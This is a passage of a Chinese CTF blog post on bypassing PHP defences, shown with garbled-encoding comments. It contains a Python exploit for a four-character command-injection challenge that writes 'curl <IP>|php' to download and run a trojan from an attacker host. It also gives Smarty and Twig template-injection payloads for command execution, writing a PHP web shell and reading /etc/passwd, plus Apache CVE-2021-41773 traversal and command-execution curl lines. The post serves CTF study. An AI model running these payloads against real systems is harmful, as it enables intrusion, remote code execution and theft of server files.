class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf8-*-</span></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">target = <span class="string">&#x27;http://52.197.41.31/&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># å­˜æ”¾å¾…ä¸‹è½½æ–‡ä»¶çš„å…¬ç½‘ä¸»æœºçš„IP</span></span><br><span class="line">shell_ip = <span class="string">&#x27;xx.xx.xx.xx&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># æœ¬æœºIP</span></span><br><span class="line">your_ip = r.get(<span class="string">&#x27;http://ipv4.icanhazip.com/&#x27;</span>).text.strip()</span><br><span class="line"> </span><br><span class="line"><span class="comment"># å°†shell_IPè½¬æ¢æˆåå…­è¿›åˆ¶</span></span><br><span class="line">ip = <span class="string">&#x27;0x&#x27;</span> + <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>(i))[<span class="number">2</span>:].zfill(<span class="number">2</span>))</span><br><span class="line">                     <span class="keyword">for</span> i <span class="keyword">in</span> shell_ip.split(<span class="string">&#x27;.&#x27;</span>)])</span><br><span class="line"> </span><br><span class="line">reset = target + <span class="string">&#x27;?reset&#x27;</span></span><br><span class="line">cmd = target + <span class="string">&#x27;?cmd=&#x27;</span></span><br><span class="line">sandbox = target + <span class="string">&#x27;sandbox/&#x27;</span> + </span><br><span class="line">    hashlib.md5(<span class="string">&#x27;orange&#x27;</span> + your_ip).hexdigest() + <span class="string">&#x27;/&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># payloadæŸäº›ä½ç½®çš„å¯é€‰å­—ç¬¦</span></span><br><span class="line">pos0 = random.choice(<span class="string">&#x27;efgh&#x27;</span>)</span><br><span class="line">pos1 = random.choice(<span class="string">&#x27;hkpq&#x27;</span>)</span><br><span class="line">pos2 = <span class="string">&#x27;g&#x27;</span>  <span class="comment"># éšæ„é€‰æ‹©å­—ç¬¦</span></span><br><span class="line"> </span><br><span class="line">payload = [</span><br><span class="line">    <span class="string">&#x27;&gt;dir&#x27;</span>,</span><br><span class="line">    <span class="comment"># åˆ›å»ºåä¸º dir çš„æ–‡ä»¶</span></span><br><span class="line"> </span><br><span class="line">    <span class="string">&#x27;&gt;%s&gt;&#x27;</span> % pos0,</span><br><span class="line">    <span class="comment"># å‡è®¾pos0é€‰æ‹© f , åˆ›å»ºåä¸º f&gt; çš„æ–‡ä»¶</span></span><br><span class="line"> </span><br><span class="line">    <span class="string">&#x27;&gt;%st-&#x27;</span> % pos1,</span><br><span class="line">    <span class="comment"># å‡è®¾pos1é€‰æ‹© k , åˆ›å»ºåä¸º kt- çš„æ–‡ä»¶,å¿…é¡»åŠ ä¸ªpos1ï¼Œ</span></span><br><span class="line">    <span class="comment"># å› ä¸ºalphabeticalåºä¸­t&gt;s</span></span><br><span class="line"> </span><br><span class="line">    <span class="string">&#x27;&gt;sl&#x27;</span>,</span><br><span class="line">    <span class="comment"># åˆ›å»ºåä¸º &gt;sl çš„æ–‡ä»¶ï¼›åˆ°æ­¤å¤„æœ‰å››ä¸ªæ–‡ä»¶ï¼Œ</span></span><br><span class="line">    <span class="comment"># ls çš„ç»“æœä¼šæ˜¯ï¼šdir f&gt; kt- sl</span></span><br><span class="line"> </span><br><span class="line">    <span class="string">&#x27;*&gt;v&#x27;</span>,</span><br><span class="line">    <span class="comment"># å‰æ–‡æåˆ°ï¼Œ * ç›¸å½“äº `ls` ï¼Œé‚£ä¹ˆè¿™æ¡å‘½ä»¤ç­‰ä»·äº `dir f&gt; kt- sl`&gt;v ï¼Œ</span></span><br><span class="line">    <span class="comment">#  å‰é¢æåˆ°diræ˜¯ä¸æ¢è¡Œçš„ï¼Œæ‰€ä»¥è¿™æ—¶ä¼šåˆ›å»ºæ–‡ä»¶ v å¹¶å†™å…¥ f&gt; kt- sl</span></span><br><span class="line">    <span class="comment"># éå¸¸å¥‡å¦™ï¼Œè¿™é‡Œçš„æ–‡ä»¶åæ˜¯ v ï¼Œåªèƒ½æ˜¯v ï¼Œæ²¡æœ‰å¯é€‰å­—ç¬¦</span></span><br><span class="line"> </span><br><span class="line">    <span class="string">&#x27;&gt;rev&#x27;</span>,</span><br><span class="line">    <span class="comment"># åˆ›å»ºåä¸º rev çš„æ–‡ä»¶ï¼Œè¿™æ—¶å½“å‰ç›®å½•ä¸‹ ls çš„ç»“æœæ˜¯ï¼š dir f&gt; kt- rev sl v</span></span><br><span class="line"> </span><br><span class="line">    <span class="string">&#x27;*v&gt;%s&#x27;</span> % pos2,</span><br><span class="line">    <span class="comment"># é­”æ³•å‘ç”Ÿåœ¨è¿™é‡Œï¼š *v ç›¸å½“äº rev v ï¼Œ* çœ‹ä½œé€šé…ç¬¦ã€‚å‰æ–‡ä¹Ÿæè¿‡äº†ï¼Œä½“ä¼šä¸€ä¸‹ã€‚</span></span><br><span class="line">    <span class="comment"># è¿™æ—¶pos2æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯ g æ–‡ä»¶å†…å®¹æ˜¯æ–‡ä»¶vå†…å®¹çš„åè½¬ï¼š ls -tk &gt; f</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># ç»­è¡Œåˆ†å‰² curl 0x11223344|php å¹¶é€†åºå†™å…¥</span></span><br><span class="line">    <span class="string">&#x27;&gt;p&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;ph\&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;|\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;%s\<span class="string">&#x27; % ip[8:10],</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;%s\<span class="string">&#x27; % ip[6:8],</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;%s\<span class="string">&#x27; % ip[4:6],</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;%s\<span class="string">&#x27; % ip[2:4],</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;%s\<span class="string">&#x27; % ip[0:2],</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt; \<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;rl\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;cu\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    &#x27;</span>sh <span class="string">&#x27; + pos2,</span></span><br><span class="line"><span class="string">    # sh g ;g çš„å†…å®¹æ˜¯ ls -tk &gt; f ï¼Œé‚£ä¹ˆå°±ä¼šæŠŠé€†åºçš„å‘½ä»¤åè½¬å›æ¥ï¼Œ</span></span><br><span class="line"><span class="string">    # è™½ç„¶ f çš„æ–‡ä»¶å¤´éƒ¨ä¼šæœ‰æ‚è´¨ï¼Œä½†ä¸å½±å“æœ‰æ•ˆå‘½ä»¤çš„æ‰§è¡Œ</span></span><br><span class="line"><span class="string">    &#x27;</span>sh <span class="string">&#x27; + pos0,</span></span><br><span class="line"><span class="string">    # sh f æ‰§è¡Œcurlå‘½ä»¤ï¼Œä¸‹è½½æ–‡ä»¶ï¼Œå†™å…¥æœ¨é©¬ã€‚</span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">s = r.get(reset)</span></span><br><span class="line"><span class="string">for i in payload:</span></span><br><span class="line"><span class="string">    assert len(i) &lt;= 4</span></span><br><span class="line"><span class="string">    s = r.get(cmd + i)</span></span><br><span class="line"><span class="string">    print &#x27;</span>[%d]<span class="string">&#x27; % s.status_code, s.url</span></span><br><span class="line"><span class="string">    sleep(0.1)</span></span><br><span class="line"><span class="string">s = r.get(sandbox + &#x27;</span>fun.php?cmd=uname -a<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">print &#x27;</span>[%d]<span class="string">&#x27; % s.status_code, s.url</span></span><br><span class="line"><span class="string">print s.text</span></span><br></pre></td></tr></table></figure><p>â€‹</p></li></ul></li></ul><h3 id="æ¨¡æ¿å¼•æ“"><a href="#æ¨¡æ¿å¼•æ“" class="headerlink" title="æ¨¡æ¿å¼•æ“"></a>æ¨¡æ¿å¼•æ“</h3><p>å¯¹äºPHPçš„æ¨¡æ¿å¼•æ“ï¼Œå¾ˆæœ‰å¯èƒ½æ˜¯smartyæˆ–è€…twigã€‚</p><p>æ ¹æ®æµç¨‹å›¾æµ‹è¯•ï¼š</p><p><img src="/2020/05/18/web-PHP%E7%BB%95%E8%BF%87/image-20220309192940209-16468253816721.png" alt="image-20220309192940209"></p><h4 id="smarty"><a href="#smarty" class="headerlink" title="smarty"></a>smarty</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#123;&#123;<span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>)&#125;&#125; ï¼ˆæœ‰å›æ˜¾ï¼‰</span><br><span class="line">&#123;<span class="variable">$smarty</span>.version&#125; ï¼ˆsmartyç‰ˆæœ¬å·ï¼‰</span><br><span class="line">&#123;php&#125;<span class="title function_ invoke__">phpinfo</span>();&#123;/php&#125; ï¼ˆåºŸå¼ƒï¼‰</span><br><span class="line">&#123;<span class="keyword">if</span> <span class="title function_ invoke__">phpinfo</span>()&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">&#123;<span class="built_in">self</span>::<span class="title function_ invoke__">getStreamVariable</span>(â€œ<span class="attr">file</span>:///etc/passwdâ€)&#125; ï¼ˆæ—§ç‰ˆæœ¬ï¼‰</span><br><span class="line"></span><br><span class="line">&#123;<span class="variable">$s</span>=<span class="variable">$smarty</span>.template_object-&gt;smarty&#125;&#123;<span class="variable">$fp</span>=<span class="variable">$smarty</span>.template_object-&gt;compiled-&gt;filepath&#125;&#123;<span class="title class_">Smarty_Internal_Runtime_WriteFile</span>::<span class="title function_ invoke__">writeFile</span>(<span class="variable">$fp</span>,<span class="string">&quot;&lt;?php+phpinfo();&quot;</span>,<span class="variable">$s</span>)&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="variable">$smarty</span>.template_object-&gt;smarty-&gt;<span class="title function_ invoke__">disableSecurity</span>()-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&#x27;string:&#123;system(\&#x27;id\&#x27;)&#125;&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="function"><span class="keyword">function</span> <span class="title">name</span>=&#x27;<span class="title">rce</span>(<span class="params"></span>)</span>&#123;&#125;;<span class="title function_ invoke__">system</span>(<span class="string">&quot;id&quot;</span>);<span class="function"><span class="keyword">function</span> &#x27;&#125;</span>&#123;/<span class="function"><span class="keyword">function</span>&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># <span class="title">Smarty3</span> </span></span><br><span class="line"><span class="function"><span class="title">string</span>:</span>&#123;<span class="keyword">include</span> file=<span class="string">&#x27;C:/Windows/win.ini&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># CVE-2021-26120ï¼ŒSmarty&lt;3.1.39</span></span><br><span class="line"><span class="keyword">string</span>:&#123;<span class="function"><span class="keyword">function</span> <span class="title">name</span>=&#x27;<span class="title">x</span>(<span class="params"></span>)</span>&#123;&#125;;<span class="title function_ invoke__">system</span>(whoami);<span class="function"><span class="keyword">function</span> &#x27;&#125;</span>&#123;/<span class="function"><span class="keyword">function</span>&#125; </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># <span class="title">CVE</span>-2021-26119ï¼Œ<span class="title">Smarty</span>=3.1.44/4.1.0</span></span><br><span class="line"><span class="function"><span class="title">string</span>:</span>&#123;<span class="variable">$smarty</span>.template_object-&gt;smarty-&gt;<span class="title function_ invoke__">_getSmartyObj</span>()-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&#x27;string:&#123;system(whoami)&#125;&#x27;</span>)&#125;</span><br><span class="line"><span class="keyword">string</span>:&#123;<span class="variable">$smarty</span>.template_object-&gt;smarty-&gt;<span class="title function_ invoke__">enableSecurity</span>()-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&#x27;string:&#123;system(whoami)&#125;&#x27;</span>)&#125;</span><br><span class="line"><span class="keyword">string</span>:&#123;<span class="variable">$smarty</span>.template_object-&gt;smarty-&gt;<span class="title function_ invoke__">disableSecurity</span>()-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&#x27;string:&#123;system(whoami)&#125;&#x27;</span>)&#125;</span><br><span class="line"><span class="keyword">string</span>:&#123;<span class="variable">$smarty</span>.template_object-&gt;smarty-&gt;<span class="title function_ invoke__">addTemplateDir</span>(<span class="string">&#x27;./x&#x27;</span>)-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&#x27;string:&#123;system(whoami)&#125;&#x27;</span>)&#125;</span><br><span class="line"><span class="keyword">string</span>:&#123;<span class="variable">$smarty</span>.template_object-&gt;smarty-&gt;<span class="title function_ invoke__">setTemplateDir</span>(<span class="string">&#x27;./x&#x27;</span>)-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&#x27;string:&#123;system(whoami)&#125;&#x27;</span>)&#125;</span><br><span class="line"><span class="keyword">string</span>:&#123;<span class="variable">$smarty</span>.template_object-&gt;smarty-&gt;<span class="title function_ invoke__">addPluginsDir</span>(<span class="string">&#x27;./x&#x27;</span>)-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&#x27;string:&#123;system(whoami)&#125;&#x27;</span>)&#125;</span><br><span class="line"><span class="keyword">string</span>:&#123;<span class="variable">$smarty</span>.template_object-&gt;smarty-&gt;<span class="title function_ invoke__">setPluginsDir</span>(<span class="string">&#x27;./x&#x27;</span>)-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&#x27;string:&#123;system(whoami)&#125;&#x27;</span>)&#125;</span><br><span class="line"><span class="keyword">string</span>:&#123;<span class="variable">$smarty</span>.template_object-&gt;smarty-&gt;<span class="title function_ invoke__">setCompileDir</span>(<span class="string">&#x27;./x&#x27;</span>)-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&#x27;string:&#123;system(whoami)&#125;&#x27;</span>)&#125;</span><br><span class="line"><span class="keyword">string</span>:&#123;<span class="variable">$smarty</span>.template_object-&gt;smarty-&gt;<span class="title function_ invoke__">setCacheDir</span>(<span class="string">&#x27;./x&#x27;</span>)-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&#x27;string:&#123;system(whoami)&#125;&#x27;</span>)&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment"># CVE-2021-29454ï¼ŒPHP7ï¼ŒSmarty&lt;3.1.42/&lt;4.0.2</span></span><br><span class="line"><span class="keyword">eval</span>:&#123;math equation=<span class="string">&#x27;(&quot;\163\171\163\164\145\155&quot;)(&quot;\167\150\157\141\155\151&quot;)&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><h4 id="twig"><a href="#twig" class="headerlink" title="twig"></a>twig</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;/etc/passwd&#x27;|file_excerpt(1,30)&#125;&#125;</span><br><span class="line">&#123;&#123;app.request.files.get(1).__construct(&#x27;/etc/passwd&#x27;,&#x27;&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;app.request.files.get(1).openFile.fread(99)&#125;&#125;</span><br><span class="line">&#123;&#123;_self.env.enableDebug()&#125;&#125;&#123;&#123;_self.env.isDebug()&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;id&quot;]|map(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;&#123;&quot;&lt;?php phpinfo();&quot;:&quot;/var/www/html/shell.php&quot;&#125;|map(&quot;file_put_contents&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;id&quot;,0]|sort(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;id&quot;]|filter(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[0,0]|reduce(&quot;system&quot;,&quot;id&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&#x27;cat /etc/passwd&#x27;]|filter(&#x27;system&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">POST /subscribe?0=cat+/etc/passwd HTTP/1.1</span><br><span class="line">&#123;&#123;app.request.query.filter(0,0,1024,&#123;&#x27;options&#x27;:&#x27;system&#x27;&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7518#toc-5">TWIG å…¨ç‰ˆæœ¬é€šç”¨ SSTI payloads</a></p><p>â€‹</p><h3 id="åæ··æ·†"><a href="#åæ··æ·†" class="headerlink" title="åæ··æ·†"></a>åæ··æ·†</h3><p><a target="_blank" rel="noopener" href="https://www.zhaoyuanma.com/phpjm.html">https://www.zhaoyuanma.com/phpjm.html</a></p><p><a target="_blank" rel="noopener" href="https://yoursunny.com/p/PHP-decode/">https://yoursunny.com/p/PHP-decode/</a></p><p>â€‹</p><h3 id="ä¸­é—´ä»¶æ¼æ´"><a href="#ä¸­é—´ä»¶æ¼æ´" class="headerlink" title="ä¸­é—´ä»¶æ¼æ´"></a>ä¸­é—´ä»¶æ¼æ´</h3><h4 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h4><ul><li><p>Apache 2.4.49</p><p>CVE-2021-41773</p><p>ç›®å½•ç©¿è¶Šæ¼æ´ã€‚å¯ä»¥è¯»å–åˆ°ApacheæœåŠ¡å™¨Webç›®å½•ä»¥å¤–çš„å…¶ä»–æ–‡ä»¶ï¼Œæˆ–è€…è¯»å–Webä¸­çš„è„šæœ¬æºç ï¼Œæˆ–è€…åœ¨å¼€å¯cgiæˆ–cgidçš„æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p><p><code>curl -v --path-as-is http://your-ip:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd</code></p><p><code>curl -v --data &quot;echo;å‘½ä»¤&quot; &#39;http://your-ip:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh&#39;</code></p></li></ul><p>â€‹</p><h3 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h3><h4 id="opcache"><a href="#opcache" class="headerlink" title="opcache"></a>opcache</h4><p>opencacheæ˜¯ä¸€ç§php7è‡ªå¸¦çš„ç¼“å­˜å¼•æ“ï¼Œå®ƒå°†ç¼–è¯‘è¿‡ä¸€éçš„çš„phpè„šæœ¬ä»¥å­—èŠ‚ç æ–‡ä»¶çš„å½¢å¼ç¼“å­˜åœ¨ç‰¹å®šç›®å½•ä¸­ï¼ˆåœ¨php.iniä¸­æŒ‡å®šï¼‰ã€‚è¿™æ ·èŠ‚çœäº†æ¯æ¬¡è®¿é—®åŒä¸€è„šæœ¬éƒ½è¦åŠ è½½å’Œè§£æçš„æ—¶é—´å¼€é”€ã€‚ï¼ˆå…ˆæ£€æŸ¥æœ‰æ²¡æœ‰binæ–‡ä»¶æœ‰å°±ç›´æ¥ç”¨ï¼‰</p><p><a target="_blank" rel="noopener" href="http://redteam.today/2018/04/08/opcache%E7%BC%93%E5%AD%98getshell/">opcacheç¼“å­˜getshell</a></p></div><div class="article-footer"></div></article><section id="comments"><div id="vcomments"></div></section></div><nav class="bar bar-footer clearfix" data-stick-bottom><div class="bar-inner"><ul class="pager pull-left"><li class="prev"><a href="/2020/05/24/misc-%E9%9B%B6%E5%AE%BD%E5%BA%A6%E5%AD%97%E7%AC%A6%E9%9A%90%E5%86%99/" title="é›¶å®½åº¦å­—ç¬¦éšå†™"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;ä¸Šä¸€ç¯‡</span></a></li><li class="next"><a href="/2020/05/18/crypto-%E4%BB%BF%E5%B0%84%E5%AF%86%E7%A0%81/" title="ä»¿å°„å¯†ç "><span>ä¸‹ä¸€ç¯‡&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a></li><li class="toggle-toc"><a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="æ–‡ç« ç›®å½•" role="button"><span>[&nbsp;</span><span>æ–‡ç« ç›®å½•</span> <i class="text-collapsed icon icon-anchor"></i> <i class="text-in icon icon-close"></i> <span>]</span></a></li></ul><button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>èµ</span></button><div class="bar-right"><div class="share-component" data-sites="weibo,qq,wechat" data-mobile-sites="weibo,qq,wechat"></div></div></div></nav><div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog"><div class="modal-dialog" role="document"><div class="modal-content donate"><button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button><div class="modal-body"><div class="donate-box"><div class="donate-head"><p>è¿™ç¯‡æ–‡ç« å¯¹ä½ æœ‰ç”¨ï¼Œèµä¸€æ¯å’–å•¡â˜•~~</p></div><div class="tab-content"><div role="tabpanel" class="tab-pane fade active in" id="wechatpay"><div class="donate-payimg"><img src="/images/donate/wechatpayimg.png" alt="æ‰«ç æ”¯æŒ" title="æ‰«ä¸€æ‰«"></div><p class="text-muted mv">âLazzaroâ </p><p class="text-grey">æ‰“å¼€å¾®ä¿¡æ‰«ä¸€æ‰«å³å¯æ‰«ç æ‰“èµä»–ä¸€æ³¢å“¦~</p></div><div role="tabpanel" class="tab-pane fade" id="alipay"><div class="donate-payimg"><img src="/images/donate/alipayimg.png" alt="æ‰«ç æ”¯æŒ" title="æ‰«ä¸€æ‰«"></div><p class="text-muted mv">âLazzaroâ </p><p class="text-grey">æ‰“å¼€æ”¯ä»˜å®æ‰«ä¸€æ‰«å³å¯æ‰«ç æ‰“èµä»–ä¸€æ³¢å“¦~</p></div></div><div class="donate-footer"><ul class="nav nav-tabs nav-justified" role="tablist"><li role="presentation" class="active"><a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="true"><i class="icon icon-wepay"></i> å¾®ä¿¡æ”¯ä»˜</a></li><li role="presentation"><a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="false"><i class="icon icon-alipay"></i> æ”¯ä»˜å®</a></li></ul></div></div></div></div></div></div></main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter"><ul class="social-links"><li><a href="https://github.com/Lazzzaro" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li></ul><div class="copyright">&copy; 2025 Lazzaro<br><span>æ€»è®¿é—® - <span id="busuanzi_value_site_pv"></span>æ¬¡</span><br><span>è®¿å®¢æ•° - <span id="busuanzi_value_site_uv"></span>äºº</span><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer><script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script><script>window.jQuery||document.write('<script src="js/jquery.min.js"><\/script>')</script><script src="/js/plugin.min.js"></script><script src="/js/application.js"></script><script>window.INSIGHT_CONFIG={TRANSLATION:{POSTS:"æ–‡ç« ",PAGES:"é¡µé¢",CATEGORIES:"ç±»åˆ«",TAGS:"å…³é”®è¯",UNTITLED:"(æœªå‘½å)"},ROOT_URL:"/",CONTENT_URL:"/content.json"}</script><script src="/js/insight.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//cdn.jsdelivr.net/npm/valine"></script><script type="text/javascript">var GUEST=["nick","mail","link"],meta=(meta="nick,mail,link").split(",").filter(function(e){return-1<GUEST.indexOf(e)});new Valine({el:"#vcomments",verify:!1,notify:!1,appId:"sK4BUsDgfSB843HYgJyTcV7P-gzGzoHsz",appKey:"NKNx8m2CtFeDofr8LNLX7aNG",placeholder:"æ¥æ¥æ¥è¯´ç‚¹å•¥~~\r\nå¯¹ä½ æœ‰ç”¨ï¼Ÿèµä¸€æ³¢ï¼â†˜â†˜",avatar:"mp",meta:meta,pageSize:"10",visitor:!0})</script><script defer type="text/javascript">!function(e,a,t,n,g,c){e.GoogleAnalyticsObject=n,e.ga=e.ga||function(){(e.ga.q=e.ga.q||[]).push(arguments)},e.ga.l=+new Date,g=a.createElement(t),c=a.getElementsByTagName(t)[0],g.async=1,g.src="//www.google-analytics.com/analytics.js",c.parentNode.insertBefore(g,c)}(window,document,"script","ga"),ga("create","UA-165804489-1","auto"),ga("send","pageview")</script><style>.copy-btn{display:inline-block;padding:6px 12px;font-size:13px;font-weight:700;line-height:20px;color:#333;white-space:nowrap;vertical-align:middle;cursor:pointer;background-color:#eee;background-image:linear-gradient(#fcfcfc,#eee);border:1px solid #d5d5d5;border-radius:3px;user-select:none;outline:0}.highlight-wrap .copy-btn{transition:opacity .3s ease-in-out;opacity:0;padding:2px 6px;position:absolute;right:4px;top:8px;z-index:2}.highlight-wrap .copy-btn:focus,.highlight-wrap:hover .copy-btn{opacity:1}.highlight-wrap{position:relative}</style><script>addLoadEvent(()=>{$(".highlight").each(function(t,e){var n=$("<div>").addClass("highlight-wrap");$(e).after(n),n.append($("<button>").addClass("copy-btn").append("å¤åˆ¶").on("click",function(t){var e=$(this).parent().find(".code")[0].innerText;e+="\n/**\n* å¤åˆ¶å¹¶ä½¿ç”¨ä»£ç è¯·æ³¨æ˜å¼•ç”¨å‡ºå¤„å“¦~\n* Lazzaro @ https://lazzzaro.github.io\n*/";var n=document.createElement("textarea");document.body.appendChild(n),n.style.position="absolute",n.style.top="0px",n.style.left="0px",n.value=e,n.select(),n.focus();e=document.execCommand("copy");document.body.removeChild(n),e?$(this).text("å¤åˆ¶æˆåŠŸ"):$(this).text("å¤åˆ¶å¤±è´¥"),$(this).blur()})).on("mouseleave",function(t){var e=$(this).find(".copy-btn");setTimeout(function(){e.text("å¤åˆ¶")},300)}).append(e)})})</script><script type="text/x-mathjax-config">MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
